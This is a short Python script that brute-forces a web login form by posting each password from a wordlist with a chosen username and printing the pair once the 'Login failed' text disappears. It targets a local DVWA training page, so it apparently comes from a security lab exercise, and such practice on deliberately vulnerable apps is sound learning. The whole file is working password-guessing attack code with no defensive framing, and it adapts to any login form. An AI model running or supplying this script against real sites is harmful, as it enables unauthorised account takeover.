#!/usr/bin/python3

import requests

def bruteforce(username, url):

    with open("passwords.txt", "r", encoding="utf-8") as passwords_file:
        passwords = passwords_file.readlines()

    for password in passwords:
        password = password.strip()
        
        print("[+] Trying to Bruteforce with password:", password)
        
        data_dictinary = {"username": username, "password": password, "Login": "submit"}
        
        response = requests.post(url, data=data_dictinary)
        
        if "Login failed" in response.content.decode("utf-8"):
            pass
        else:
            print("[+] Username --->>", username)
            print("[+] password ---->>", password)
            exit()

page_url = "http://10.0.2.4/dvwa/login.php"

username = input("Enter Username for Specified page: ")

bruteforce(username, page_url)

print("[-] Password is not in the list!")
